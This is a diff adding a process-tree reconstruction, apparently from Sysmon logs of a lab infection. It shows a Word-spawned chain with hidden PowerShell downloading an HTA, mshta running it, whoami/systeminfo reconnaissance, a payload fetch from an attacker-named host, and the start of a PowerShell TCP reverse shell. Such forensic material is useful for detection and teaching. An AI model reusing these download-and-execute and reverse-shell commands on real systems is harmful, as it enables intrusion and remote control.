@@ -1,0 +1,13 @@
+PROCESS TREE (from Event ID 1)
+============================================================
+[parent not in log: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE]
+|- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe   powershell.exe -nop -w hidden -c Invoke-WebRequest -Uri http://192.168.56.104:8080/stage1.hta -OutFile C:\Users\jdoe\AppData\Local\Temp\stage1.hta
+  |- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe   powershell.exe -c [Environment]::SetEnvironmentVariable('KDMTMP','C:\Users\jdoe\AppData\Local\Temp','User')
+  |- C:\Windows\System32\mshta.exe   mshta.exe C:\Users\jdoe\AppData\Local\Temp\stage1.hta
+    |- C:\Windows\System32\cmd.exe   cmd.exe /c whoami /all
+    |- C:\Windows\System32\cmd.exe   cmd.exe /c whoami /all
+    |- C:\Windows\System32\cmd.exe   cmd.exe /c whoami /all
+    |- C:\Windows\System32\cmd.exe   cmd.exe /c systeminfo
+    |- C:\Windows\System32\cmd.exe   cmd.exe /c systeminfo
+    |- C:\Users\jdoe\AppData\Local\Temp\update.exe   update.exe --fetch http://cdn.malicious-update.io:8080/payload/final_stage.zip
+      |- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe   powershell -nop -c $c=New-Object Net.Sockets.TCPClient('192.168.56.104',4444);$s=$c.GetStream()
